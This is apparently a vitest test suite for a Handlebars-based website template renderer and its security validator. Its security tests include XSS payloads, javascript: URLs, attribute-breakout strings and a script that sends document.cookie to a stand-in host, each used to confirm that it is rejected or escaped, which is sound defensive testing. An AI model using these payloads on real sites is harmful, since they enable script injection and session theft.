import { describe, it, expect } from 'vitest';
import { renderTemplate, validateTemplate, TemplateError, type TemplateContext } from '../src/template.js';

const ctx: TemplateContext = {
  company: { name: 'Acme & Co', address: { city: 'Berlin' } },
  website: { siteUrl: 'https://acme.test' },
  page: { title: 'Home', published: '2026-06-01T12:00:00Z' },
  data: {
    products: [
      { name: 'Widget', price: 9 },
      { name: 'Gadget', price: 12 },
    ],
    tags: ['a', 'b'],
    featured: true,
    empty: [],
  },
};

describe('dataset-aware {{#each}} — flattened fields + preview markers', () => {
  const items = [
    { id: 'e1', dataset: 'posts', values: { t: 'A' } },
    { id: 'e2', dataset: 'posts', values: { t: 'B' } },
  ];
  // Over a DATASET the iteration context IS entry.values, so fields are read directly ({{t}}, not {{values.t}}).
  const src = '<ul>{{#each data.posts}}<li>{{t}}</li>{{else}}<li>none</li>{{/each}}</ul>';

  it('flattens entry fields and exposes the envelope on @entry', () => {
    const out = renderTemplate('{{#each data.posts}}{{t}}:{{@entry.id}}:{{@entry.dataset}}{{#if @first}}*{{/if}};{{/each}}', {
      data: { posts: items },
    });
    expect(out).toBe('A:e1:posts*;B:e2:posts;');
  });

  it('wraps each row in a data-sw-entry marker ONLY when markEntries is set', () => {
    expect(renderTemplate(src, { data: { posts: items }, markEntries: true })).toBe(
      '<ul><div data-sw-entry="e1" data-sw-dataset="posts"><li>A</li></div><div data-sw-entry="e2" data-sw-dataset="posts"><li>B</li></div></ul>',
    );
  });

  it('emits NO wrapper without markEntries — publish is byte-identical to a plain loop', () => {
    expect(renderTemplate(src, { data: { posts: items } })).toBe('<ul><li>A</li><li>B</li></ul>');
  });

  it('renders the {{else}} inverse for an empty list', () => {
    expect(renderTemplate(src, { data: { posts: [] }, markEntries: true })).toBe('<ul><li>none</li></ul>');
  });

  it('a non-entry array (no id/dataset) falls through to the built-in #each (no flatten, no marker)', () => {
    const out = renderTemplate('{{#each nav.header}}<a href="{{sw-url this.href}}">{{this.label}}</a>{{/each}}', {
      nav: { header: [{ label: 'Home', href: '/' }] },
      markEntries: true,
    });
    expect(out).toBe('<a href="/">Home</a>');
  });

  it('supports block params ({{#each data.posts as |post idx|}}) over flattened entry fields', () => {
    const out = renderTemplate('{{#each data.posts as |post idx|}}{{idx}}:{{post.t}};{{/each}}', { data: { posts: items } });
    expect(out).toBe('0:A;1:B;');
  });

  it('preserves ../ parent access from inside a dataset loop', () => {
    const out = renderTemplate('{{#each data.posts}}{{t}}@{{../page.title}};{{/each}}', {
      data: { posts: items },
      page: { title: 'Home' },
    });
    expect(out).toBe('A@Home;B@Home;');
  });
});

describe('page.slug + parentPage bindings', () => {
  it('renders page.slug and the parentPage view (path + data) through the context whitelist', () => {
    const ctx = {
      page: { title: 'Web', slug: 'web', path: '/services/web' },
      parentPage: { title: 'Services', slug: 'services', path: '/services', data: { eyebrow: 'What we do' } },
    };
    const out = renderTemplate(
      '<a href="{{sw-url parentPage.path}}">{{parentPage.title}}</a>/<b>{{page.slug}}</b> — {{parentPage.data.eyebrow}}',
      ctx,
    );
    expect(out).toBe('<a href="/services">Services</a>/<b>web</b> — What we do');
  });

  it('renders empty for parentPage.* when there is no parent (binding absent)', () => {
    const out = renderTemplate('[{{parentPage.path}}][{{parentPage.data.x}}]', { page: { slug: '', path: '/' } });
    expect(out).toBe('[][]');
  });
});

describe('{{item.<dataset>.<key>}} — direct keyed access', () => {
  const item = { services: { web: { title: 'Web Dev', price: 'from $10k' } } };
  it('resolves a keyed entry field without a loop', () => {
    expect(renderTemplate('<h1>{{item.services.web.title}}</h1>', { item })).toBe('<h1>Web Dev</h1>');
    expect(renderTemplate('<p>{{item.services.web.price}}</p>', { item })).toBe('<p>from $10k</p>');
  });
  it('renders empty for an unknown key (no error)', () => {
    expect(renderTemplate('[{{item.services.nope.title}}]', { item })).toBe('[]');
  });
});

describe('renderTemplate — Handlebars features', () => {
  it('passes literal HTML through and interpolates + HTML-escapes values', () => {
    expect(renderTemplate('<div class="grid">{{ page.title }}</div>', ctx)).toBe('<div class="grid">Home</div>');
    expect(renderTemplate('{{ company.name }}', ctx)).toBe('Acme &amp; Co');
    expect(renderTemplate('{{ company.address.city }}', ctx)).toBe('Berlin');
  });

  it('escapes an HTML-bearing value (XSS-safe in body/quoted attr)', () => {
    expect(renderTemplate('{{ page.t }}', { page: { t: '<script>alert(1)</script>' } })).toBe(
      '&lt;script&gt;alert(1)&lt;/script&gt;',
    );
  });

  it('supports {{#if}}/{{else}} and {{#unless}}', () => {
    expect(renderTemplate('{{#if data.featured}}Y{{else}}N{{/if}}', ctx)).toBe('Y');
    expect(renderTemplate('{{#if data.empty}}Y{{else}}N{{/if}}', ctx)).toBe('N');
    expect(renderTemplate('{{#unless page.missing}}ok{{/unless}}', ctx)).toBe('ok');
  });

  it('supports {{#each}} with @index/@first/@last and item fields', () => {
    expect(renderTemplate('{{#each data.products}}{{@index}}:{{name}}{{#unless @last}}, {{/unless}}{{/each}}', ctx)).toBe(
      '0:Widget, 1:Gadget',
    );
    expect(renderTemplate('{{#each data.tags}}[{{this}}]{{/each}}', ctx)).toBe('[a][b]');
  });

  it('supports {{#each}} @key over an object and block params', () => {
    const c: TemplateContext = { data: { obj: { a: 1, b: 2 } } };
    expect(renderTemplate('{{#each data.obj as |v k|}}{{k}}={{v}};{{/each}}', c)).toBe('a=1;b=2;');
  });

  it('supports {{#with}}, {{lookup}}, subexpressions, and @root', () => {
    expect(renderTemplate('{{#with company.address}}{{city}}{{/with}}', ctx)).toBe('Berlin');
    expect(renderTemplate('{{#each data.products}}{{ lookup ../data.tags @index }}{{/each}}', ctx)).toBe('ab');
    expect(renderTemplate('{{#each data.products}}{{ @root.company.name }} {{/each}}', ctx)).toBe('Acme &amp; Co Acme &amp; Co ');
  });

  it('renders partials in the current scope (incl. inside each)', () => {
    const c: TemplateContext = { ...ctx, partials: { card: '<li>{{name}} ({{price}})</li>' } };
    expect(renderTemplate('<ul>{{#each data.products}}{{> card}}{{/each}}</ul>', c)).toBe(
      '<ul><li>Widget (9)</li><li>Gadget (12)</li></ul>',
    );
  });

  it('VALIDATES partial sources too (an unsafe partial is rejected, not just the main template)', () => {
    const c: TemplateContext = { partials: { evil: '<script>steal()</script>' } };
    expect(() => renderTemplate('<div>{{> evil}}</div>', c)).toThrow(TemplateError);
  });

  it('turns a circular {{> partial}} chain into a clear error (not a worker crash)', () => {
    const c: TemplateContext = { partials: { a: '{{> b}}', b: '{{> a}}' } };
    expect(() => renderTemplate('{{> a}}', c)).toThrow(/circular|partial/i);
  });
});

describe('renderTemplate — curated helpers (extensibility)', () => {
  it('{{sw-date}} formats a date (default + iso)', () => {
    expect(renderTemplate('{{sw-date page.published}}', ctx)).toBe('2026-06-01');
    expect(renderTemplate('{{sw-date page.published "iso"}}', ctx)).toBe('2026-06-01T12:00:00.000Z');
    expect(renderTemplate('{{sw-date page.nope}}', ctx)).toBe('');
  });

  it('{{sw-url}} sanitizes the scheme', () => {
    expect(renderTemplate('<a href="{{sw-url page.link}}">x</a>', { page: { link: 'javascript:alert(1)' } })).toBe(
      '<a href="#">x</a>',
    );
    expect(renderTemplate('<a href="{{sw-url page.link}}">x</a>', { page: { link: 'https://ok.test/a' } })).toBe(
      '<a href="https://ok.test/a">x</a>',
    );
  });

  it('{{sw-truncate}} clips long text', () => {
    expect(renderTemplate('{{sw-truncate page.t 5}}', { page: { t: 'abcdefgh' } })).toBe('abcd…');
    expect(renderTemplate('{{sw-truncate page.t 5}}', { page: { t: 'abc' } })).toBe('abc');
  });

  it('{{sw-icon}} inlines a built-in SVG (trusted body, escaped class), empty for unknown', () => {
    const out = renderTemplate('{{sw-icon "arrow-right" "h-5 w-5"}}', ctx);
    expect(out).toContain('<svg class="h-5 w-5"');
    expect(out).toContain('stroke="currentColor"');
    expect(out).toContain('aria-hidden="true"');
    expect(out).toContain('<path d="M5 12h14"'); // arrow-right body, emitted raw (SafeString)
    // Unknown icon → nothing (never reflects the name).
    expect(renderTemplate('[{{sw-icon "does-not-exist"}}]', ctx)).toBe('[]');
    // The class is attribute-escaped (no breakout possible).
    expect(renderTemplate('{{sw-icon "check" "a\\"onerror=x"}}', ctx)).not.toContain('"onerror=x');
  });

  it('{{sw-icon}} renders a brand: logo as a filled path (themeable), empty for an unknown brand', () => {
    const out = renderTemplate('{{sw-icon "brand:whatsapp" "h-4 w-4"}}', ctx);
    expect(out).toContain('<svg class="h-4 w-4"');
    expect(out).toContain('fill="currentColor"'); // brand logos fill (theme via text color), not stroke
    expect(out).toContain('<path d="'); // the brand path, emitted raw (SafeString)
    expect(out).not.toContain('stroke="currentColor"');
    // Unknown brand slug → nothing.
    expect(renderTemplate('[{{sw-icon "brand:nope"}}]', ctx)).toBe('[]');
  });

  it('{{sw-flag}} inlines a full-color country flag (rect + circle), labeled, empty for unknown', () => {
    const rect = renderTemplate('{{sw-flag "de" "h-4 rounded-sm"}}', ctx);
    expect(rect).toContain('<svg class="h-4 rounded-sm" viewBox="0 0 640 480"');
    expect(rect).toContain('role="img" aria-label="Germany"');
    expect(rect).toContain('<title>Germany</title>');
    expect(rect).toContain('fill='); // keeps its own colors — NOT currentColor
    expect(rect).not.toContain('currentColor');

    const circle = renderTemplate('{{sw-flag "de-circle"}}', ctx);
    expect(circle).toContain('viewBox="0 0 512 512"');
    expect(circle).toContain('mask id="cde-a"'); // namespaced per country+shape

    // Two flags on one page keep distinct ids (no clip/mask collision).
    const two = renderTemplate('{{sw-flag "de-circle"}}{{sw-flag "fr-circle"}}', ctx);
    expect([...two.matchAll(/mask id="(c..-a)"/g)].map((m) => m[1])).toEqual(['cde-a', 'cfr-a']);

    // Unknown code → nothing; a class with a quote can't break out (escaped).
    expect(renderTemplate('[{{sw-flag "zz"}}]', ctx)).toBe('[]');
    expect(renderTemplate('{{sw-flag "de" "a\\"onerror=x"}}', ctx)).not.toContain('"onerror=x');
  });
});

describe('renderTemplate — MINI SHOP helpers', () => {
  it('{{sw-add-to-cart}} emits an escaped add-to-cart button with a canonical numeric price', () => {
    const out = renderTemplate('{{sw-add-to-cart sku="w1" name="Widget" price="19.90"}}', {});
    expect(out).toBe('<button type="button" data-sw-cart-add data-sku="w1" data-name="Widget" data-price="19.9">Add to cart</button>');
  });

  it('{{sw-add-to-cart}} coerces a bad/negative price to 0 and falls back sku→name', () => {
    expect(renderTemplate('{{sw-add-to-cart name="Free thing" price="nope"}}', {})).toContain('data-price="0"');
    expect(renderTemplate('{{sw-add-to-cart name="X" price="-5"}}', {})).toContain('data-price="0"');
    // No sku → the name becomes the sku key.
    expect(renderTemplate('{{sw-add-to-cart name="X" price="1"}}', {})).toContain('data-sku="X"');
    // Neither sku nor name → nothing emitted.
    expect(renderTemplate('[{{sw-add-to-cart price="1"}}]', {})).toBe('[]');
  });

  it('{{sw-add-to-cart}} keeps a quote/ampersand name from breaking out of the attribute', () => {
    // Hostile value via context (a Handlebars string literal can't itself contain a `"`). A double-quote
    // must stay escaped after the resolveDirectives parse→serialize round-trip → no attribute breakout.
    const out = renderTemplate('{{sw-add-to-cart sku="x" name=data.evil}}', {
      data: { evil: 'A&B" onerror=alert(1) z="' },
    });
    expect(out).not.toContain('" onerror='); // the quote stays &quot; → cannot break out
    expect(out).toContain('&quot;');
    expect(out).toContain('A&amp;B');
  });

  it('{{sw-add-to-cart}} drops an unsafe image url, keeps a safe one', () => {
    expect(renderTemplate('{{sw-add-to-cart sku="x" name="A" image="javascript:alert(1)"}}', {})).not.toContain('data-image');
    expect(renderTemplate('{{sw-add-to-cart sku="x" name="A" image="/img/a.png"}}', {})).toContain('data-image="/img/a.png"');
  });

  it('{{sw-add-to-cart}} uses website.shop.addToCartLabel as the default, label= overrides', () => {
    const ctxShop = { website: { shop: { addToCartLabel: 'Add to basket' } } };
    expect(renderTemplate('{{sw-add-to-cart sku="x" name="A" price="1"}}', ctxShop)).toContain('>Add to basket</button>');
    expect(renderTemplate('{{sw-add-to-cart sku="x" name="A" price="1" label="Buy"}}', ctxShop)).toContain('>Buy</button>');
  });

  it('{{sw-cart}} emits the mount with currency + channels JSON from website.shop', () => {
    const ctxShop = {
      website: {
        shop: {
          currency: { code: 'EUR', symbol: '€', position: 'after', decimals: 2 },
          title: 'Your basket',
          channels: [
            { kind: 'whatsapp', number: '+14155550123', label: 'WhatsApp' },
            { kind: 'payment', urlTemplate: 'https://paypal.me/acme/{total}' },
          ],
        },
      },
    };
    const out = renderTemplate('{{sw-cart}}', ctxShop);
    expect(out.startsWith('<div data-sw-cart')).toBe(true);
    expect(out).toContain('data-currency-symbol="€"');
    expect(out).toContain('data-currency-code="EUR"');
    expect(out).toContain('data-currency-pos="after"');
    expect(out).toContain('data-cart-title="Your basket"');
    // channels are JSON, attribute-escaped (the JSON quotes become &quot;)
    expect(out).toContain('data-channels="');
    expect(out).toContain('&quot;kind&quot;:&quot;whatsapp&quot;');
    expect(out).toContain('&quot;urlTemplate&quot;:&quot;https://paypal.me/acme/{total}&quot;');
  });

  it('{{sw-cart}} still emits a bare mount when no shop config is set', () => {
    expect(renderTemplate('{{sw-cart}}', {})).toBe('<div data-sw-cart></div>');
  });

  it('{{sw-cart}} emits the editable cart note (data-note)', () => {
    const out = renderTemplate('{{sw-cart}}', { website: { shop: { note: 'Order request only.' } } });
    expect(out).toContain('data-note="Order request only."');
  });

  it('{{sw-cart}} projects a form channel only when its endpoint is resolved', () => {
    const withEp = { website: { shop: { channels: [{ kind: 'form', formId: 'order', endpoint: '/f/p1/order', label: 'Place order' }] } } };
    const out = renderTemplate('{{sw-cart}}', withEp);
    expect(out).toContain('data-channels=');
    expect(out).toContain('/f/p1/order');
    expect(out).toContain('&quot;kind&quot;:&quot;form&quot;');
    // a form channel WITHOUT a resolved endpoint is dropped (here it's the only one → bare mount)
    expect(renderTemplate('{{sw-cart}}', { website: { shop: { channels: [{ kind: 'form', formId: 'order' }] } } })).toBe('<div data-sw-cart></div>');
  });

  it('{{sw-cart}} unicode-escapes < > & in the channels JSON (survives the directive round-trip)', () => {
    const ctxShop = { website: { shop: { channels: [{ kind: 'mailto', email: 'a@b.test', label: 'B&H <Photo>' }] } } };
    const out = renderTemplate('{{sw-cart}}', ctxShop);
    // markup-significant chars in the label are \u-escaped inside the JSON, never raw < > &
    expect(out).toContain('B\\u0026H \\u003cPhoto\\u003e');
    expect(out).not.toContain('B&H <Photo>');
  });
});

describe('renderTemplate — security', () => {
  it('disables prototype access', () => {
    expect(renderTemplate('[{{ company.constructor }}]', ctx)).toBe('[]');
    expect(renderTemplate('[{{ company.__proto__ }}]', ctx)).toBe('[]');
  });

  it('does not re-evaluate a value that looks like a tag (no injection from data)', () => {
    const c: TemplateContext = { page: { title: '{{ company.secret }}' }, company: { secret: 'LEAK' } };
    expect(renderTemplate('{{ page.title }}', c)).toBe('{{ company.secret }}');
  });

  it('caps output size', () => {
    const c: TemplateContext = { data: { items: Array.from({ length: 5000 }, () => 'xxxxxxxxxx') } };
    expect(() => renderTemplate('{{#each data.items}}{{this}}{{/each}}', c, { maxOutput: 1000 })).toThrow(TemplateError);
  });
});

describe('validateTemplate — context-aware rejection (Handlebars is not context-aware)', () => {
  const rejects = (tpl: string) => expect(() => validateTemplate(tpl)).toThrow(TemplateError);
  const allows = (tpl: string) => expect(() => validateTemplate(tpl)).not.toThrow();

  it('bans raw {{{ }}} output', () => {
    rejects('<p>{{{ page.html }}}</p>');
  });

  it('rejects interpolation in an unquoted attribute', () => {
    rejects('<div class={{ data.cls }}>x</div>');
  });

  it('rejects interpolation in event-handler and style attributes', () => {
    rejects('<button onclick="{{ data.x }}">x</button>');
    rejects('<div style="color:{{ data.c }}">x</div>');
  });

  it('rejects interpolation in <script>, <style>, and HTML comments', () => {
    rejects('<script>var x = {{ data.x }};</script>');
    rejects('<style>.a { color: {{ data.c }} }</style>');
    rejects('<!-- {{ page.title }} -->');
  });

  it('requires {{sw-url …}} (not a bare value) inside URL attributes', () => {
    rejects('<a href="{{ page.link }}">x</a>');
    allows('<a href="{{sw-url page.link}}">x</a>');
    allows('<a href="/p/{{ page.slug }}">x</a>'); // literal prefix fixes the scheme → allowed
  });

  it('gates the lazy-load data-src / data-bg URL attributes like src / background', () => {
    // The runtime swaps these into src / background-image, so an interpolated value (often
    // lower-trust data) must be scheme-fixed — same rule as src.
    rejects('<img data-src="{{ page.img }}" alt="x">');
    allows('<img data-src="{{sw-url page.img}}" alt="x">');
    allows('<img data-src="/media/x.jpg" alt="x">'); // literal safe prefix
    rejects('<div data-bg="{{ page.img }}"></div>');
    allows('<div data-bg="{{sw-url page.img}}"></div>');
    allows('<div data-bg="/media/x.jpg"></div>'); // literal safe prefix for data-bg too
    allows('<iframe data-src="{{sw-url page.embed}}" title="m"></iframe>'); // iframes too
    // An unsafe literal prefix can't smuggle a scheme past the interpolation (same as href).
    rejects('<img data-src="j{{ page.rest }}" alt="x">'); // → javascript:
    rejects('<div data-bg="//{{ page.host }}"></div>'); // protocol-relative
  });

  it('does NOT gate data-srcset or other data-* (only data-src/data-bg join the URL set)', () => {
    allows('<img data-srcset="{{ page.srcset }}" alt="x">'); // mirrors plain srcset — image-fetch only
    allows('<div data-sw-text="{{ data.v }}"></div>'); // editor directive attr — unaffected
    allows('<div data-aos="{{ data.fx }}"></div>'); // animation attr — unaffected
  });

  it('allows interpolation in element text and quoted non-URL attributes', () => {
    allows('<p data-x="{{ data.v }}">{{ data.v }}</p>');
    allows('{{#each data.products}}<span>{{name}}</span>{{/each}}'); // block tags are not output mustaches
  });

  it('renderTemplate runs the validator (rejects an unsafe template before rendering)', () => {
    expect(() => renderTemplate('<div class={{ data.cls }}>x</div>', ctx)).toThrow(TemplateError);
  });
});

describe('validateTemplate — no tenant JS + URL scheme (security-review fixes)', () => {
  const rejects = (tpl: string) => expect(() => validateTemplate(tpl)).toThrow(TemplateError);
  const allows = (tpl: string) => expect(() => validateTemplate(tpl)).not.toThrow();

  it('rejects a <script> element even with no interpolation', () => {
    rejects('<p>hi</p><script>alert(1)</script>');
  });

  it('rejects a <script> hidden inside an {{#*inline}} partial body (the inline-partial bypass)', () => {
    rejects('{{#*inline "x"}}<script>fetch("//e/"+document.cookie)</script>{{/inline}}{{> x}}');
  });

  it('rejects inline on* event-handler attributes (literal or interpolated)', () => {
    rejects('<div onmouseover="steal()">x</div>');
    rejects('<button onclick="{{ data.x }}">x</button>');
  });

  it('rejects a URL whose scheme a bare literal prefix does NOT fix', () => {
    rejects('<a href="j{{ data.rest }}">x</a>'); // assembles javascript:
    rejects('<a href="//{{ data.host }}">x</a>'); // protocol-relative
    rejects('<img src="data:{{ data.b64 }}">'); // data: scheme
  });

  it('still allows safe URL prefixes and the {{sw-url}} helper', () => {
    allows('<a href="/p/{{ page.slug }}">x</a>');
    allows('<a href="https://x.test/{{ page.slug }}">x</a>');
    allows('<a href="#{{ page.frag }}">x</a>');
    allows('<a href="{{sw-url page.link}}">x</a>');
  });

  it('neuters the {{log}} helper (no stdout disclosure)', () => {
    // log is unregistered → {{log x}} no longer writes the value to stdout; it errors instead.
    expect(() => renderTemplate('{{log company.name}}', { company: { name: 'Acme' } })).toThrow(TemplateError);
  });
});

describe('validateTemplate — skeleton-owned semantic landmarks are reserved', () => {
  const rejects = (tpl: string) => expect(() => validateTemplate(tpl)).toThrow(TemplateError);
  const allows = (tpl: string) => expect(() => validateTemplate(tpl)).not.toThrow();

  it('rejects each landmark element the skeleton declares (<nav>/<main>/<footer>/<aside>)', () => {
    rejects('<nav class="navbar">x</nav>');
    rejects('<main class="p-4">x</main>');
    rejects('<footer>x</footer>');
    rejects('<aside>x</aside>');
  });

  it('rejects a landmark hidden inside an {{#*inline}} partial body too', () => {
    rejects('{{#*inline "f"}}<footer>x</footer>{{/inline}}{{> f}}');
  });

  it('the error names the element and points at the reserved id + a fix', () => {
    expect(() => validateTemplate('<nav>x</nav>')).toThrow(/<nav> element is not allowed.*top-nav.*<div>/s);
    expect(() => validateTemplate('<main>x</main>')).toThrow(/<main>.*page-content/s);
    expect(() => validateTemplate('<footer>x</footer>')).toThrow(/<footer>.*id="footer".*<div>/s);
    expect(() => validateTemplate('<aside>x</aside>')).toThrow(/<aside>.*sidebar-left/s);
  });

  it('allows neutral wrappers and non-reserved semantic elements (<section>/<article>/<header>/<ul>)', () => {
    allows('<div class="footer">x</div>');
    allows('<section><h1>{{ page.title }}</h1></section>');
    allows('<article class="prose">x</article>');
    allows('<header class="hero">x</header>'); // <header> is NOT a skeleton landmark
    allows('<ul class="menu"><li><a href="/">Home</a></li></ul>');
  });

  it('does not false-match a tag whose name merely starts with a landmark (<navbar>/<mainframe>)', () => {
    allows('<navbar>x</navbar>');
    allows('<mainframe>x</mainframe>');
  });
});
